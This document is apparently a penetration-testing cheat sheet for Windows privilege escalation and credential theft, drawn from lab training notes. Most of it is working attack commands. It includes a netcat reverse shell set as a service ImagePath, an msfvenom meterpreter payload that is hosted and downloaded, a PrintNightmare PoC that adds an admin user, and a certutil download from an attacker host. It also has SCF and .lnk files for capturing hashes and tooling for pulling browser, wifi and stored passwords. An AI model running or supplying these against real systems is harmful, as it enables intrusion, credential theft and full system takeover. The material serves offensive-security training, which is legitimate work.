```

```cmd
sc start WindscribeService
```

## Weak Service Permissions - Cleanup

### Reverting the Binary Path

```cmd
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

[SC] ChangeServiceConfig SUCCESS
```

### Starting the Service Again

If all goes to plan, we can start the service again without an issue.

```cmd
C:\htb> sc start WindScribeService
 
SERVICE_NAME: WindScribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1716
        FLAGS              :
```

### Verifying Service is Running

Querying the service will show it running again as intended.

```cmd
sc query WindScribeService
```

## Unquoted Service Path

Searching for Unquoted Service Paths

```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

## Permissive Registry ACLs

### Checking for Weak Service ACLs in Registry

```cmd
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

### Changing ImagePath with PowerShell

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

## Modifiable Registry Autorun Binary

### Check Startup Programs

We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

# Kernel Exploits

## Notable Vulnerabilities

1. **MS08-067**
   - **Type:** Remote Code Execution
   - **Affected Systems:** Windows Server 2000, 2003, 2008; Windows XP, Vista
   - **Description:** Exploits RPC request handling in the "Server" service, allowing SYSTEM-level code execution. Often used with port forwarding to bypass firewall restrictions on port 445.
   - **Tools:** Standalone and Metasploit versions available.

2. **MS17-010 (EternalBlue)**
   - **Type:** Remote Code Execution
   - **Affected Systems:** SMBv1 protocol
   - **Description:** Exploits SMB protocol mishandling, leading to SYSTEM-level code execution. Can be used for local privilege escalation if port 445 is blocked.
   - **Tools:** Metasploit Framework and standalone scripts.

3. **ALPC Task Scheduler 0-Day**
   - **Type:** Local Privilege Escalation
   - **Description:** Uses ALPC endpoint method to manipulate DACLs in .job files, allowing SYSTEM-level access via the Spooler service.
https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html

4. **CVE-2021-36934 (HiveNightmare/SeriousSam)**
   - **Type:** Local Privilege Escalation
   - **Affected Systems:** Windows 10
   - **Description:** Allows any user to read sensitive registry hives (SAM, SYSTEM, SECURITY) and extract password hashes.
   - **Tools:** [PoC exploit](https://github.com/GossiTheDog/HiveNightmare) and SecretsDump.py for offline processing.

Checking Permissions on the SAM File

```cmd
icacls c:\Windows\System32\config\SAM
```

```powershell
PS C:\Users\htb-student\Desktop> .\HiveNightmare.exe
```

```shell
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

5. **CVE-2021-1675/CVE-2021-34527 (PrintNightmare)**

- **Type:** Remote Code Execution
- **Affected Systems:** All supported Windows versions
- **Description:** Exploits a flaw in RpcAddPrinterDriver, allowing any authenticated user to install print drivers without SeLoadDriverPrivilege, leading to SYSTEM-level remote code execution.
- **Impact:** Affects Domain Controllers, Windows 7, 10, and often Windows servers due to the default running of the Print Spooler service.
- **Mitigation:** Microsoft released a second patch in July 2021; ensure specific registry settings are set to 0 or not defined.
- **Exploits:**
  - [PoC by @cube0x0](https://github.com/cube0x0/CVE-2021-1675) for executing malicious DLLs remotely or locally.
  - C# and PowerShell implementations available.
  - [PowerShell script](https://github.com/calebstewart/CVE-2021-1675) can add a local admin user or execute a custom DLL for a reverse shell.

Checking for Spooler Service

```powershell
PS C:\htb> ls \\localhost\pipe\spoolss


    Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
                                                  spoolss
```

Adding Local Admin with PrintNightmare PowerShell PoC

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

```powershell
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

Confirming New Admin User

```powershell
net user hacker
```

## Examining Installed Updates

To identify missing patches, examine installed updates using the following commands:

```powershell
PS C:\htb> systeminfo
PS C:\htb> wmic qfe list brief
PS C:\htb> Get-Hotfix
```

Viewing Installed Updates with WMI

```shell
wmic qfe list brief
```

## Exploiting CVE-2020-0668

Checking Current User Privileges

```shell
whoami /priv
```

Building the Exploit

We can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.

Compile the following files using Visual Studio:

- `CVE-2020-0668.exe`
- `CVE-2020-0668.exe.config`
- `CVE-2020-0668.pdb`
- `NtApiDotNet.dll`
- `NtApiDotNet.xml`

At this point, we can use the exploit to create a file of our choosing in a protected folder such as C:\Windows\System32. We aren't able to overwrite any protected Windows files. This privileged file write needs to be chained with another vulnerability, such as [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges. However, the UsoDllLoader technique may not work if Windows Updates are pending or currently being installed, and the DiagHub service may not be available.

We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users. The (non-system protected) binary for this service is located below.

- `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

Checking Permissions on Binary

```shell
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

Generating Malicious Binary

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```

Hosting the Malicious Binary

```bash
python3 -m http.server 8080
```

Downloading the Malicious Binary

```powershell
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

> [!NOTE]
> For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.
> 
> We need to do this because running the exploit corrupts the malicious version of `maintenanceservice.exe` that is moved to (our copy in `c:\Users\htb-student\Desktop` that we are targeting) `c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe` which we will need to account for later. If we attempt to utilize the copied version, we will receive a `system error 216` because the .exe file is no longer a valid binary.

Running the Exploit

```shell
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

Checking Permissions of New File

```shell
icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
```

Replacing File with Malicious Binary

```shell
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

## Metasploit Resource Script

Save the following commands to a file named `handler.rc`:

```plaintext
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```

Launching Metasploit with Resource Script

```bash
sudo msfconsole -r handler.rc
```

Starting the Service

```powershell
net start MozillaMaintenance
```

# Vulnerable Services

Enumerating Installed Programs

```cmd
wmic product get name
```

Search for vulnerable software versions.

Here's a more detailed hacking cheatsheet on DLL Injection, including commands, code examples, and tool links:

# DLL Injection

DLL Injection is a technique used to insert code into a running process by loading a Dynamic Link Library (DLL). This allows the injected code to execute within the context of the target process, potentially altering its behavior or accessing its resources. While it has legitimate uses, such as hot patching, it is also exploited by attackers to evade security measures.

## Methods

### LoadLibrary
- **Description**: Utilizes the `LoadLibrary` API to load a DLL into the target process's address space.
- **Legitimate Use Example**:
  ```c
  #include <windows.h>
  #include <stdio.h>

  int main() {
      HMODULE hModule = LoadLibrary("example.dll");
      if (hModule == NULL) {
          printf("Failed to load example.dll\n");
          return -1;
      }
      printf("Successfully loaded example.dll\n");
      return 0;
  }
  ```

### Manual Mapping
- **Description**: An advanced method that manually loads a DLL into a process's memory, resolving imports and relocations without using `LoadLibrary`.
- **Steps**:
  1. Load the DLL as raw data into the injecting process.
  2. Map the DLL sections into the target process.
  3. Inject shellcode to execute the DLL, handling relocations and imports manually.

### Reflective DLL Injection
- **Description**: Uses reflective programming to load a library from memory into a host process. The library implements a minimal PE loader.
- **GitHub Resource**: [Stephen Fewer's Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection)
- **Process**:
  1. Write the library into the target process's address space.
  2. Transfer execution to the library's `ReflectiveLoader` function.
  3. The loader calculates its own memory location, resolves imports, and relocates the image.
  4. Calls the library's entry point function, `DllMain`.

### DLL Hijacking
- **Description**: Exploits the DLL search order to load malicious DLLs when an application doesn't specify the full path.
- **Safe DLL Search Mode**:
  - **Enable/Disable**:
    1. Open `Regedit`.
    2. Navigate to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager`.
    3. Modify `SafeDllSearchMode` value (1 to enable, 0 to disable).
- **Tools**:
  - [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer): View running processes and loaded DLLs.
  - PE Explorer: Examine PE files and their imported DLLs.
- **Example Process**:
  1. Identify a DLL the target application is attempting to load but cannot find.
  2. Use tools like Process Explorer to monitor DLL loading activities.
  3. Create a malicious DLL with the same name as the missing one.
  4. Place the malicious DLL in a directory that is searched before the legitimate one.

- **Code Example for Proxying**:
  ```c
  // tamper.c
  #include <stdio.h>
  #include <Windows.h>

  #ifdef _WIN32
  #define DLL_EXPORT __declspec(dllexport)
  #else
  #define DLL_EXPORT
  #endif

  typedef int (*AddFunc)(int, int);

  DLL_EXPORT int Add(int a, int b) {
      HMODULE originalLibrary = LoadLibraryA("library.o.dll");
      if (originalLibrary != NULL) {
          AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
          if (originalAdd != NULL) {
              printf("============ HIJACKED ============\n");
              int result = originalAdd(a, b);
              printf("= Adding 1 to the sum to be evil\n");
              result += 1;
              printf("============ RETURN ============\n");
              return result;
          }
      }
      return -1;
  }
  ```

- **Invalid Libraries**:
  - **Description**: Replace a valid library the program is attempting to load but cannot find with a crafted library.
  - **Code Example**:
    ```c
    #include <stdio.h>
    #include <Windows.h>

    BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
        switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            printf("Hijacked... Oops...\n");
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
        }
        return TRUE;
    }
    ```

## Tools and Resources
- **Process Explorer**: Part of Microsoft's Sysinternals suite, provides detailed information on running processes and their loaded DLLs.
- **PE Explorer**: A tool to open and examine PE files, revealing imported DLLs and functions.
- **Procmon (Process Monitor)**: Useful for tracking DLL loading and identifying missing DLLs.

# Credential Hunting

Credentials are crucial for privilege escalation and gaining access to systems. They can be found in various locations on a system, often stored insecurely.

## Application Configuration Files

- **Search for Passwords in Config Files**: Applications may store passwords in cleartext within configuration files. Use `findstr` to locate these files.
  ```powershell
  findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
  ```
  - **Sensitive IIS Information**: Check `web.config` files for credentials, typically found at `C:\inetpub\wwwroot\web.config`.

## Dictionary Files

- **Chrome Dictionary Files**: Users may add passwords to dictionary files to avoid spellcheck underlines.
  ```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
  ```

## Unattended Installation Files

- **Unattend.xml**: These files may contain plaintext or base64 encoded passwords.

```cmd
dir Windows\Panther\unattend.xml
```

  ```xml
  <AutoLogon>
      <Password>
          <Value>local_4dmin_p@ss</Value>
          <PlainText>true</PlainText>
      </Password>
  </AutoLogon>
  ```

## PowerShell History File

- **Location**: `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.
- **Read PowerShell History**:
  ```powershell
gc (Get-PSReadLineOption).HistorySavePath
  ```
- **Retrieve All Accessible History Files**:
  ```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
  ```

## PowerShell Credentials

- **Decrypting PowerShell Credentials**: Credentials stored using DPAPI can be decrypted if executed in the same user context.
  ```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
  ```
# Other Files

## Tools and Resources
- **Snaffler**: Use [Snaffler](https://github.com/SnaffCon/Snaffler) to crawl network share drives for interesting file extensions like `.kdbx`, `.vmdk`, `.vdhx`, `.ppk`, etc.

## Manually Searching the File System for Credentials

We can search the file system or share drive(s) manually using the following commands from [this cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/).
### Search File Contents for Strings

- **Example 1**:
  ```cmd
  cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
  ```

- **Example 2**:
  ```cmd
  findstr /si password *.xml *.ini *.txt *.config
  ```

- **Example 3**:
  ```cmd
  findstr /spin "password" *.*
  ```

- **Using PowerShell**:
  ```powershell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
  ```

### Search for File Extensions

- **Example 1**:
  ```cmd
  dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
  ```

- **Example 2**:
  ```cmd
  where /R C:\ *.config
  ```

- **Using PowerShell**:
  ```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
  ```

## Sticky Notes Passwords

- **Location**: `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`
- **Viewing Sticky Notes Data**:
  - Use [DB Browser for SQLite](https://sqlitebrowser.org/dl/) to view the `Text` column in the `Note` table.
  - **Using PowerShell** with [PSSQLite module](https://github.com/RamblingCookieMonster/PSSQLite):
    ```powershell
  Set-ExecutionPolicy Bypass -Scope Process
  Import-Module .\PSSQLite.psd1
  $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
  Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
    ```

- **Using `strings` Command**:
  ```shell
  fango@htb[/htb]$ strings plum.sqlite-wal
  ```

## Other Files of Interest

- **Potential Credential Files**:
  ```shell
  %SYSTEMDRIVE%\pagefile.sys
  %WINDIR%\debug\NetSetup.log
  %WINDIR%\repair\sam
  %WINDIR%\repair\system
  %WINDIR%\repair\software, %WINDIR%\repair\security
  %WINDIR%\iis6.log
  %WINDIR%\system32\config\AppEvent.Evt
  %WINDIR%\system32\config\SecEvent.Evt
  %WINDIR%\system32\config\default.sav
  %WINDIR%\system32\config\security.sav
  %WINDIR%\system32\config\software.sav
  %WINDIR%\system32\config\system.sav
  %WINDIR%\system32\CCM\logs\*.log
  %USERPROFILE%\ntuser.dat
  %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
  %WINDIR%\System32\drivers\etc\hosts
  C:\ProgramData\Configs\*
  C:\Program Files\Windows PowerShell\*
  ```

Understanding how to manually search for these files is crucial, as automated scripts may not cover all potential files of interest.

# Further Credential Theft

## Cmdkey Saved Credentials

- **Description**: Use `cmdkey` to manage stored credentials for remote connections.
- **Commands**:
  - List saved credentials: `cmdkey /list`
  - Run commands as another user: `runas /savecred /user:username "COMMAND HERE"`
- **Tools**: [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey)

## Browser Credentials

- **Description**: Retrieve saved credentials from Google Chrome using SharpChrome.
- **Commands**:
  - Retrieve Chrome logins: `.\SharpChrome.exe logins /unprotect`
- **Tools**: [SharpChrome](https://github.com/GhostPack/SharpDPAPI)

## Password Managers

- **Description**: Access password managers like KeePass to extract and crack password hashes.
- **Commands**:
  - Extract KeePass hash: `python2.7 keepass2john.py file.kdbx`
  - Crack hash with Hashcat: `hashcat -m 13400 hashfile wordlist`
- **Tools**: [keepass2john](https://gist.github.com/HarmJ0y), [Hashcat](https://github.com/hashcat), [John the Ripper](https://github.com/openwall/john)

## Email

- **Description**: Search emails for credentials using MailSniper.
- **Tools**: [MailSniper](https://github.com/dafthack/MailSniper)

## More Fun with Credentials

- **Description**: Use LaZagne to retrieve credentials from various software.
- **Commands**:
  - View help menu: `.\lazagne.exe -h`
  - Run all modules: `.\lazagne.exe all`
- **Tools**: [LaZagne](https://github.com/AlessandroZ/LaZagne)

## Even More Fun with Credentials

- **Description**: Extract saved session credentials using SessionGopher.
- **Commands**:
  - Run SessionGopher: `Invoke-SessionGopher -Target TARGET`
- **Tools**: [SessionGopher](https://github.com/Arvanaghi/SessionGopher)

## Clear-Text Password Storage in the Registry

- **Description**: Enumerate registry for clear-text passwords.
- **Commands**:
  - Enumerate Autologon: `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
  - Enumerate PuTTY sessions: `reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions`
- **Tools**: [Introduction to Windows Command Line](https://academy.hackthebox.com/module/167/section/1623)

## Wifi Passwords

- **Description**: Retrieve saved wireless network passwords.
- **Commands**:
  - List wireless profiles: `netsh wlan show profile`
  - Show wireless key: `netsh wlan show profile network_name key=clear`

# Citrix Breakout

## Overview
Organizations use virtualization platforms like Citrix to provide remote access while implementing "lock-down" measures to enhance security. Despite these restrictions, threat actors can potentially "break-out" of these environments.

## Basic Methodology for Break-out
1. Gain access to a `Dialog Box`.
2. Exploit the Dialog Box for `command execution`.
3. `Escalate privileges` for higher access.

## Bypassing Path Restrictions
- **Objective**: Access restricted directories.
- **Method**: Use Windows dialog boxes (e.g., from MS Paint) to enter paths directly.
- **Example**: Enter `\\127.0.0.1\c$\users\pmorgan` in the dialog box to access directories.
- **Tools**: MS Paint, Notepad, Wordpad.

## Accessing SMB Share from Restricted Environment
- **Objective**: Transfer files despite restrictions.
- **Method**: Use UNC paths in dialog boxes to access SMB shares.
- **Command**: Start SMB server with `smbserver.py`.
- **Example**: Access share with `\\10.13.38.95\share` in Paint's dialog box.

## Alternate Explorer
- **Objective**: Bypass File Explorer restrictions.
- **Tools**: Use `Q-Dir` or `Explorer++` to navigate restricted directories.
- **Link**: [Explorer++](https://explorerplusplus.com/)

## Alternate Registry Editors
- **Objective**: Edit registry despite restrictions.
- **Tools**: Use alternative editors like [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/), [SmallRegistryEditor](https://sourceforge.net/projects/sre/).

## Modify Existing Shortcut File
- **Objective**: Gain access by modifying shortcuts.
- **Steps**:
  1. Right-click shortcut, select `Properties`.
  2. Modify `Target` field to desired executable.
  3. Execute shortcut to spawn cmd.

## Script Execution
- **Objective**: Execute scripts to bypass restrictions.
- **Method**: Create and run scripts like `.bat` files.
- **Example**: Create `evil.bat` with `cmd` command to open Command Prompt.

## Escalating Privileges
- **Objective**: Identify and exploit system vulnerabilities.
- **Tools**: Use [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS), [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1).
- **Example**: Use `PowerUp.ps1` to create `UserAdd.msi` for privilege escalation.

## Bypassing UAC
- **Objective**: Overcome User Account Control restrictions.
- **Method**: Use UAC bypass scripts.
- **Example**: Import and execute `Bypass-UAC.ps1` with `Bypass-UAC -Method UacMethodSysprep`.

# Interacting with Users

## Overview
Users can be a weak link in security. Techniques to exploit this include capturing credentials through network sniffing or placing malicious files on shared drives to capture user password hashes.

## Traffic Capture
- **Objective**: Capture network traffic to obtain credentials.
- **Tools**: `Wireshark`, `tcpdump`, [net-creds](https://github.com/DanMcInerney/net-creds).
- **Example**: Capture cleartext FTP credentials using Wireshark.
- **Command**: Run `tcpdump` or `Wireshark` to monitor traffic.

## Process Command Lines
- **Objective**: Monitor command lines for credentials.
- **Script**: Capture process command lines every two seconds and compare for differences.
- **Example**: Use PowerShell script to reveal passwords passed in command lines.

```powershell
while($true) {
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Vulnerable Services
- **Objective**: Exploit vulnerable applications for privilege escalation.
- **Example**: [CVE-2019–15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) in Docker Desktop allows writing malicious executables for privilege escalation.

## SCF on a File Share
- **Objective**: Capture NTLMv2 password hashes using SCF files.
- **Tools**: [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh).
- **Example**: Create a malicious SCF file to capture hashes when accessed.

```shell
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

- **Command**: Start Responder to capture hashes.

```shell
sudo responder -wrf -v -I tun0
```

## Capturing Hashes with a Malicious .lnk File
- **Objective**: Use .lnk files to capture hashes on Server 2019.
- **Tools**: [Lnkbomb](https://github.com/dievus/lnkbomb).
- **Example**: Generate a malicious .lnk file using PowerShell.

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

# Miscellaneous Techniques
## Living Off The Land Binaries and Scripts (LOLBAS)
- **LOLBAS Project**: Utilizes Microsoft-signed binaries, scripts, and libraries for unexpected functionalities like code execution, file transfers, and UAC bypass.
- **Certutil.exe**: 
  - **File Transfer**: `certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat`
  - **Encoding**: `certutil -encode file1 encodedfile`
  - **Decoding**: `certutil -decode encodedfile file2`
- **Rundll32.exe**: Executes DLL files, potentially for reverse shells.

## Always Install Elevated
- **Policy Setting**: Enables installation with elevated privileges via Local Group Policy.
- **Enumeration**: 
  - `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
  - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
- **Exploitation**: Create a malicious MSI package with `msfvenom` and execute it to gain SYSTEM privileges.
  - **Command**: `msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart`
  - **Listener**: `nc -lnvp 9443`

## CVE-2019-1388
- **Vulnerability**: Exploits Windows Certificate Dialog to run a browser as SYSTEM.
- **Exploitation Steps**:
  - Run `hhupd.exe` as administrator.
  - Click on certificate hyperlink to open a browser as SYSTEM.
  - Use `View page source` to launch `cmd.exe` as SYSTEM.

## Scheduled Tasks
- **Enumeration**: 
  - `schtasks /query /fo LIST /v`
  - `Get-ScheduledTask | select TaskName,State`
- **Exploitation**: Look for writable directories like `C:\Scripts` to modify scripts executed by scheduled tasks.

## User/Computer Description Field
- **Local User Enumeration**: `Get-LocalUser`
- **Computer Description**: `Get-WmiObject -Class Win32_OperatingSystem | select Description`

## Mount VHDX/VMDK
- **File Types**: `.vhd`, `.vhdx`, `.vmdk` for virtual hard disks.
- **Mounting on Linux**:
  - VMDK: `guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk`
  - VHD/VHDX: `guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1`
- **Windows Mounting**: Use right-click options or PowerShell cmdlet `Mount-VHD`.
- **Hash Retrieval**: Use `secretsdump.py` to extract password hashes from registry hives.

# Windows Server

For an older OS like Windows Server 2008, we can use an enumeration script like [Sherlock](https://github.com/rasta-mouse/Sherlock) to look for missing patches. We can also use something like [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), which takes the results of the `systeminfo` command as an input, and compares the patch level of the host against the Microsoft vulnerability database to detect potential missing patches on the target. If an exploit exists in the Metasploit framework for the given missing patch, the tool will suggest it. Other enumeration scripts can assist us with this, or we can even enumerate the patch level manually and perform our own research. This may be necessary if there are limitations in loading tools on the target host or saving command output.

## Enumeration and Exploitation

### Querying Current Patch Level
- **WMI Command**: `wmic qfe` to list installed hotfixes and identify missing patches.

### Running Sherlock
- **Sherlock Script**: Used to identify missing patches and vulnerabilities.
  - **Command**: 
    ```powershell
    Set-ExecutionPolicy bypass -Scope process
    Import-Module .\Sherlock.ps1
    Find-AllVulns
    ```

## Obtaining a Meterpreter Shell
- **Metasploit smb_delivery Module**: Used to deliver a Meterpreter reverse shell.
  - **Setup**:
    ```shell
    use exploit/windows/smb/smb_delivery
    set SRVHOST 10.10.14.3
    set LHOST 10.10.14.3
    set LPORT 4444
    exploit
    ```
  - **Execution on Target**: `rundll32.exe \\10.10.14.3\lEUZam\test.dll,0`

## Privilege Escalation
- **MS10-092 Exploit**: Use the Task Scheduler XML Privilege Escalation vulnerability.
  - **Setup**:
    ```shell
    use exploit/windows/local/ms10_092_schelevator
    set SESSION 1
    set LHOST 10.10.14.3
    set LPORT 4443
    exploit
    ```
  - **Migration to 64-bit Process**: Ensure the Meterpreter session is running in a 64-bit process for compatibility.

### Receiving Elevated Reverse Shell
- **Successful Exploit**: Results in a Meterpreter session with `NT AUTHORITY\SYSTEM` privileges, allowing for further post-exploitation activities.

# Windows Desktop

## Enumeration and Exploitation

### Install Python Dependencies (Local VM)
- **Dependencies for Windows-Exploit-Suggester**:
  ```shell
  sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
  sudo tar -xf setuptools-2.0.tar.gz
  cd setuptools-2.0/
  sudo python2.7 setup.py install

  sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
  sudo tar -xf xlrd-1.0.0.tar.gz
  cd xlrd-1.0.0/
  sudo python2.7 setup.py install
  ```

### Gathering Systeminfo Command Output
- **Command**: `systeminfo` to capture system details for analysis.

### Updating the Local Microsoft Vulnerability Database
- **Command**: `sudo python2.7 windows-exploit-suggester.py --update` to update the vulnerability database.

### Running Windows Exploit Suggester
- **Command**: 
  ```shell
  python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
  ```
  - Identifies potential privilege escalation vulnerabilities.

### Exploiting MS16-032 with PowerShell PoC
- **PowerShell Exploit**: Use a PowerShell script to exploit MS16-032 for privilege escalation.
  - **Commands**:
    ```powershell
    Set-ExecutionPolicy bypass -scope process
    Import-Module .\Invoke-MS16-032.ps1
    Invoke-MS16-032
    ```

### Spawning a SYSTEM Console
- **Result**: Successful exploitation results in a SYSTEM-level command prompt.
  - **Command**: `whoami` confirms elevated privileges as `nt authority\system`.

